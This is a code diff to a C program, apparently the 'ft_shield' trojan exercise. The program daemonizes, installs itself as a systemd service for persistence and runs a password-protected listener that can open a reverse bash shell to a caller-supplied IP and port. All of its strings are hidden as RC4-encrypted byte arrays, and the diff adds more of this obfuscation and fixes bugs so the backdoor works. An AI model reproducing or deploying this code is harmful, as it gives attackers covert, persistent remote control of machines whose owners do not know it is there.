@@ -105,7 +105,7 @@ const unsigned char progpath[]	=	{0x1C, 0x0C, 0x64, 0x7A, 0xCD, 0xE6, 0x9F, 0x85
 const unsigned char binpath[]	=	{0x1C, 0x09, 0x65, 0x67, 0x81, 0xAB, 0x85, 0x8E};
 const unsigned char rootpath[]	=	{0x1C};
 const unsigned char nullpath[]	=	{0x1C, 0x18, 0x73, 0x63, 0x81, 0xA7, 0x99, 0x8C, 0xF4};
-const unsigned char targpath[]	=	{0x1C, 0x18, 0x73, 0x63, 0x81, 0xA7, 0x99, 0x8C, 0xF4};
+const unsigned char targpath[]	=	{0x1C, 0x09, 0x65, 0x67, 0x81, 0xAB, 0x85, 0x8E, 0xB7, 0x58, 0x1C, 0x3F, 0xCB, 0xD3, 0x7F, 0xB0, 0x5F, 0xF6};
 const unsigned char sfcpath[]	=	{0x1C, 0x19, 0x62, 0x76, 0x81, 0xBA, 0x95, 0x93, 0xEC, 0x5B, 0x05, 0x04, 0x97, 0xC8, 0x6F, 0xA6, 0x47, 0xF7, 0x48,
 									 0x33, 0x3A, 0x24, 0x64, 0xDE, 0x4D, 0xB6, 0x30, 0x7D, 0x14, 0xD0, 0x77, 0x0A, 0x43, 0x9B, 0x55, 0x31, 0x33};
 const unsigned char reload[]	=	{0x40, 0x05, 0x65, 0x61, 0xCB, 0xA4, 0x8F, 0x94, 0xF4, 0x1E, 0x0C, 0x01, 0xDD, 0xD6, 0x79, 0xBB, 0x1E, 0xE0, 0x40,
@@ -164,6 +164,10 @@ const unsigned char vnewline[]	=	{0x1F, 0x76};
 const unsigned char vspace[]	=	{0x1F, 0x5C};
 const unsigned char hexspec[]	=	{0x03, 0x04, 0x33, 0x25, 0x9C, 0x91};
 const unsigned char srcspec[]	=	{0x16, 0x0F};
+const unsigned char filespec[]	=	{0x1C, 0x08, 0x7B, 0x65, 0x81, 0xEC, 0x80, 0x84, 0xC7, 0x1B, 0x04, 0x0C, 0xDC, 0xE4, 0x33, 0xB9, 0x5F, 0xE7, 0x0B,
+									 0x7F};
+const unsigned char rsspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B};
+const unsigned char writemode[]	=	{0x44, 0x1E};
 
 typedef	struct	client_info
 {
@@ -219,9 +223,8 @@ void	RC4_PRGA(unsigned char *S, unsigned char *K, size_t len)
 	}
 }
 
-unsigned char	*RC4(const char *salt, const unsigned char *msg)
+unsigned char	*RC4(const char *salt, const unsigned char *msg, size_t len)
 {
-	size_t			len = strlen((const char *)msg);
 	unsigned char	*cypher = (unsigned char *)malloc(len * sizeof(unsigned char *));
 	unsigned char	S[256];
 	unsigned char	K[len];
@@ -237,9 +240,11 @@ char	*generate_random_filename()
 {
 	int		len = 70;
 	char	*filename = (char *)malloc(len);
+	unsigned char	*cypher;
 
 	if (!len)
 		exit(1);
+	cypher = RC4(LOGINS, filespec, sizeof(filespec));
 	while (true)
 	{
 		struct timespec	ts;
@@ -247,10 +252,13 @@ char	*generate_random_filename()
 		unsigned long long	random = 0;
 		for (int i = 0; i < 4; i++)
 			random = (random << 15) | (rand() & 0x7FFF);
-		if (snprintf(filename, len, "/tmp/ft_shield_%ld_%lld_%llu.c", ts.tv_sec, (long long)ts.tv_nsec, random) >= len)
+		if (snprintf(filename, len, (const char *)cypher, ts.tv_sec, (long long)ts.tv_nsec, random) >= len)
 			continue;
 		if (!access(filename, F_OK))
+		{
+			free(cypher);
 			return filename;
+		}
 		usleep(1);
 	}
 	return NULL;
@@ -307,7 +315,7 @@ bool	is_bin(void)
 {
 	char			path[PATH_MAX], rpath[PATH_MAX];
 	ssize_t			len;
-	unsigned char	*cypher = RC4(LOGINS, progpath);
+	unsigned char	*cypher = RC4(LOGINS, progpath, sizeof(progpath));
 
 	len = readlink((const char *)cypher, path, sizeof(path)-1);
 	if (len == -1)
@@ -318,7 +326,7 @@ bool	is_bin(void)
 	free(cypher);
 	if (!realpath(path, rpath))
 		exit(1);
-	cypher = RC4(LOGINS, binpath);
+	cypher = RC4(LOGINS, binpath, sizeof(binpath));
 	bool	ok = strcmp((const char *)cypher, dirname(rpath));
 	free(cypher);
 	if (ok)
@@ -338,7 +346,7 @@ void	create_daemon(void)
 		exit(0);
 	if (setsid() < 0)
 		exit(1);
-	cypher = RC4(LOGINS, rootpath);
+	cypher = RC4(LOGINS, rootpath, sizeof(rootpath));
 	if (chdir((const char *)cypher) < 0)
 	{
 		free(cypher);
@@ -346,7 +354,7 @@ void	create_daemon(void)
 	}
 	free(cypher);
 	umask(0);
-	cypher = RC4(LOGINS, nullpath);
+	cypher = RC4(LOGINS, nullpath, sizeof(nullpath));
 	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0755);
 	free(cypher);
 	if (fd < 0)
@@ -362,8 +370,8 @@ bool	file_checksum(bool bin)
 {
 	char			c;
 	long			checksum = 0;
-	unsigned char	*cypher = (bin ? RC4(LOGINS, objcmd) : RC4(LOGINS, catcmd));
-	unsigned char	*pcypher = RC4(LOGINS, permis);
+	unsigned char	*cypher = (bin ? RC4(LOGINS, objcmd, sizeof(objcmd)) : RC4(LOGINS, catcmd, sizeof(catcmd)));
+	unsigned char	*pcypher = RC4(LOGINS, permis, sizeof(permis));
 	FILE			*bintxt = popen((const char *)cypher, (const char *)pcypher);
 
 	free(cypher);
@@ -385,55 +393,60 @@ bool	file_checksum(bool bin)
 void	quine()
 {
 	int				len;
-	char			filename = generate_random_filename();
+	char			*filename = generate_random_filename();
 	char			cmd[1024];
 	FILE			*file;
 	unsigned char	*cypher;
 	unsigned char	*tcypher;
 	unsigned char	*hcypher;
+	unsigned char	*scypher;
 
-	file = fopen(filename, "wb");
+	cypher = RC4(LOGINS, writemode, sizeof(writemode));
+	file = fopen(filename, (const char *)cypher);
+	free(cypher);
 	if (!file)
 	{
 		free(filename);
 		exit(1);
 	}
-	cypher = RC4(LOGINS, frline);
-	fprintf(file, cypher);
+	cypher = RC4(LOGINS, frline, sizeof(frline));
+	scypher = RC4(LOGINS, srcspec, sizeof(srcspec));
+	fprintf(file, (const char *)scypher, (const char *)cypher);
 	free(cypher);
-	cypher = RC4(LOGINS, vnewline);
-	tcypher = RC4(LOGINS, vspace);
-	hcypher = RC4(LOGINS, hexspec);
+	cypher = RC4(LOGINS, vnewline, sizeof(vnewline));
+	tcypher = RC4(LOGINS, vspace, sizeof(vspace));
+	hcypher = RC4(LOGINS, hexspec, sizeof(hexspec));
 	for (int i = 0; i < sizeof(srccode); i++)
     {
 		if (i && i % 24 == 0)
-			fprintf(file, cypher);
+			fprintf(file, (const char *)scypher, (const char *)cypher);
 		else if (i)
-			fprintf(file, tcypher);
-		fprintf(file, hcypher, srccode[i]);
+			fprintf(file, (const char *)scypher, (const char *)tcypher);
+		fprintf(file, (const char *)hcypher, srccode[i]);
 	}
 	free(cypher);
 	free(tcypher);
 	free(hcypher);
-	cypher = RC4(LOGINS, lsline);
-	fprintf(file, cypher);
+	cypher = RC4(LOGINS, lsline, sizeof(lsline));
+	fprintf(file, (const char *)scypher, (const char *)cypher);
 	free(cypher);
-	cypher = RC4(LOGINS, srccode);
-	tcypher = RC4(LOGINS, srcspec);
-	fprintf(file, tcypher, cypher);
+	cypher = RC4(LOGINS, srccode, sizeof(srccode));
+	fprintf(file, (const char *)scypher, (const char *)cypher);
 	free(cypher);
-	free(tcypher);
-	cypher = RC4(LOGINS, runcmd);
-	tcypher = RC4(LOGINS, targpath);
-	len = sprintf(cmd, cypher, filename, tcypher);
+	free(scypher);
+	cypher = RC4(LOGINS, runcmd, sizeof(runcmd));
+	tcypher = RC4(LOGINS, targpath, sizeof(targpath));
+	len = sprintf(cmd, (const char *)cypher, filename, tcypher);
 	cmd[len] = 0;
 	if (system(cmd))
 	{
+		fclose(file);
 		free(cypher);
 		free(tcypher);
 		free(filename);
 		exit(1);
 	}
+	fclose(file);
 	free(cypher);
 	free(tcypher);
 	free(filename);
@@ -442,9 +455,7 @@ void	quine()
 
 void	move_to_target(void)
 {
-	unsigned char	*cypher = RC4(LOGINS, targpath);
-	char			bin_path[PATH_MAX], buff[4096];
-	int				src_fd, dst_fd, read_count, write_count, len;
+	unsigned char	*cypher = RC4(LOGINS, targpath, sizeof(targpath));
 
 	free(cypher);
 	if (!access((const char *)cypher, F_OK))
@@ -458,20 +469,22 @@ void	move_to_target(void)
 
 void	config_service(void)
 {
-	unsigned char	*cypher = RC4(LOGINS, sfcpath);
+	unsigned char	*cypher = RC4(LOGINS, sfcpath, sizeof(sfcpath));
 	bool			ok = access((const char *)cypher, F_OK);
 
 	if (!ok)
 	{
-		// I need to check the checksum of the service file to see if the same service we want or not
-		free(cypher);
-		return;
+		if (file_checksum(false))
+		{
+			free(cypher);
+			return;
+		}
 	}
 	int	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 	free(cypher);
 	if (fd < 0)
 		exit(1);
-	cypher = RC4(LOGINS, sfc);
+	cypher = RC4(LOGINS, sfc, sizeof(sfc));
 	if (write(fd, cypher, strlen((const char *)cypher)) < 0)
 	{
 		close(fd);
@@ -480,21 +493,21 @@ void	config_service(void)
 	}
 	close(fd);
 	free(cypher);
-	cypher = RC4(LOGINS, reload);
+	cypher = RC4(LOGINS, reload, sizeof(reload));
 	if (system((const char *)cypher))
 	{
 		free(cypher);
 		exit(1);
 	}
 	free(cypher);
-	cypher = RC4(LOGINS, enable);
+	cypher = RC4(LOGINS, enable, sizeof(enable));
 	if (system((const char *)cypher))
 	{
 		free(cypher);
 		exit(1);
 	}
 	free(cypher);
-	cypher = RC4(LOGINS, start);
+	cypher = RC4(LOGINS, start, sizeof(start));
 	if (system((const char *)cypher))
 	{
 		free(cypher);
@@ -519,7 +532,7 @@ int		init_server()
 	}
 	addr.sin_family = AF_INET;
 	addr.sin_addr.s_addr = INADDR_ANY;
-	cypher = RC4(LOGINS, servport);
+	cypher = RC4(LOGINS, servport, sizeof(servport));
 	addr.sin_port = htons(atoi((const char *)cypher));
 	free(cypher);
 	if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
@@ -586,14 +599,14 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 	int				status;
 	bool			ok = false;
 	pid_t			pid;
-	unsigned char	*cypher = RC4(LOGINS, rscreate);
+	unsigned char	*cypher = RC4(LOGINS, rscreate, sizeof(rscreate));
 
 	send_msg_to_client((char *)cypher, client_fd);
 	free(cypher);
 	pid = fork();
 	if (pid < 0)
 	{
-		cypher = RC4(LOGINS, rsfailed);
+		cypher = RC4(LOGINS, rsfailed, sizeof(rsfailed));
 		send_msg_to_client((char *)cypher, client_fd);
 		free(cypher);
 		return;
@@ -607,16 +620,19 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 
 		close(g_server->server_sock);
 		struct sockaddr_in revsockaddr;
-		if (sscanf(user_input, "%s %15s %5s", cmd, ip, port) != 3)
+		cypher = RC4(LOGINS, rsspec, sizeof(rsspec));
+		if (sscanf(user_input, (const char *)cypher, cmd, ip, port) != 3)
 		{
-			cypher = RC4(LOGINS, rsargerr);
+			free(cypher);
+			cypher = RC4(LOGINS, rsargerr, sizeof(rsargerr));
 			send_msg_to_client((char *)cypher, client_fd);
 			free(cypher);
 			exit(1);
 		}
+		free(cypher);
 		if (inet_pton(AF_INET, ip, &(revsockaddr.sin_addr)) != 1)
 		{
-			cypher = RC4(LOGINS, rsiperr);
+			cypher = RC4(LOGINS, rsiperr, sizeof(rsiperr));
 			send_msg_to_client((char *)cypher, client_fd);
 			free(cypher);
 			exit(1);
@@ -624,7 +640,7 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		int	port_to_int = atoi(port);
 		if (!(port_to_int >= 1024 && port_to_int <= 65535))
 		{
-			cypher = RC4(LOGINS, rsporterr);
+			cypher = RC4(LOGINS, rsporterr, sizeof(rsporterr));
 			send_msg_to_client((char *)cypher, client_fd);
 			free(cypher);
 			exit(1);
@@ -636,10 +652,10 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
 		if (dup2(sockt, STDIN_FILENO) < 0 || dup2(sockt, STDOUT_FILENO) < 0 || dup2(sockt, STDERR_FILENO) < 0)
 			exit(1);
-		cypher = RC4(LOGINS, bash);
+		cypher = RC4(LOGINS, bash, sizeof(bash));
 		argv[0] = (char *)cypher;
 		free(cypher);
-		cypher = RC4(LOGINS, basharg);
+		cypher = RC4(LOGINS, basharg, sizeof(basharg));
 		argv[1] = (char *)cypher;
 		free(cypher);
 		argv[2] = NULL;
@@ -651,13 +667,13 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		ok = true;
 	if (ok)
 	{
-		cypher = RC4(LOGINS, rssuccess);
+		cypher = RC4(LOGINS, rssuccess, sizeof(rssuccess));
 		send_msg_to_client((char *)cypher, client_fd);
 		free(cypher);
 	}
 	else
 	{
-		cypher = RC4(LOGINS, rsfailed);	
+		cypher = RC4(LOGINS, rsfailed, sizeof(rsfailed));	
 		send_msg_to_client((char *)cypher, client_fd);
 		free(cypher);
 	}
@@ -667,11 +683,11 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 void	handle_client_commands(int fd, char *cmd)
 {
 	char	*user_input = trim_whitespaces(cmd);
-	unsigned char	*cypher = RC4(LOGINS, (const unsigned char *)user_input);
+	unsigned char	*cypher = RC4(LOGINS, (const unsigned char *)user_input, strlen(user_input));
 	if (!strcmp((const char *)cypher, (const char *)help) || !strcmp((const char *)cypher, (const char *)qmark))
 	{
 		free(cypher);
-		cypher = RC4(LOGINS, commands);
+		cypher = RC4(LOGINS, commands, sizeof(commands));
 		send_msg_to_client((char *)cypher, fd);
 		free(cypher);
 	}
@@ -688,7 +704,7 @@ void	handle_client_commands(int fd, char *cmd)
 	else
 	{
 		free(cypher);
-		cypher = RC4(LOGINS, cnf);
+		cypher = RC4(LOGINS, cnf, sizeof(cnf));
 		send_msg_to_client((char *)cypher, fd);
 		free(cypher);
 	}
@@ -714,14 +730,14 @@ void	recv_msg_from_client(int idx)
 	buff[len-1] = 0;
 	if (!g_server->clients_info[idx].is_logged)
 	{
-		cypher = RC4(LOGINS, (const unsigned char *)buff);
+		cypher = RC4(LOGINS, (const unsigned char *)buff, sizeof(buff));
 		ok = strcmp((const char *)password, (const char *)cypher);
 		free(cypher);
 		if (!ok)
 		{
 			g_server->clients_info[idx].is_logged = true;
 			g_server->clients_info[idx].password_try_count = 0;
-			cypher = RC4(LOGINS, prompt);
+			cypher = RC4(LOGINS, prompt, sizeof(prompt));
 			send_msg_to_client((char *)cypher, client_fd);
 			free(cypher);
 		}
@@ -730,13 +746,13 @@ void	recv_msg_from_client(int idx)
 			g_server->clients_info[idx].password_try_count++;
 			if (g_server->clients_info[idx].password_try_count < 3)
 			{
-				cypher = RC4(LOGINS, passerr);
+				cypher = RC4(LOGINS, passerr, sizeof(passerr));
 				send_msg_to_client((char *)cypher, client_fd);
 				free(cypher);
 			}
 			else
 			{
-				cypher = RC4(LOGINS, maxtry);
+				cypher = RC4(LOGINS, maxtry, sizeof(maxtry));
 				send_msg_to_client((char *)cypher, client_fd);
 				free(cypher);
 				clear_client_connection(client_fd);
@@ -745,7 +761,7 @@ void	recv_msg_from_client(int idx)
 		return;
 	}
 	handle_client_commands(client_fd, buff);
-	cypher = RC4(LOGINS, prompt);
+	cypher = RC4(LOGINS, prompt, sizeof(prompt));
 	send_msg_to_client((char *)cypher, client_fd);
 	free(cypher);
 	return;
@@ -762,7 +778,7 @@ void	client_connection(void)
 		exit(1);
 	if (g_server->client_count == 3)
 	{
-		cypher = RC4(LOGINS, cnfailed);
+		cypher = RC4(LOGINS, cnfailed, sizeof(cnfailed));
 		send_msg_to_client((char *)cypher, client_fd);
 		free(cypher);
 		shutdown(client_fd, SHUT_RDWR);
@@ -778,7 +794,7 @@ void	client_connection(void)
 		g_server->client_count++;
 		break;
 	}
-	cypher = RC4(LOGINS, enterpass);
+	cypher = RC4(LOGINS, enterpass, sizeof(enterpass));
 	send_msg_to_client((char *)cypher, client_fd);
 	free(cypher);
 	return;
@@ -849,4 +865,5 @@ int	main()
 		move_to_target();
 		config_service();
 	}
+	return 0;
 }
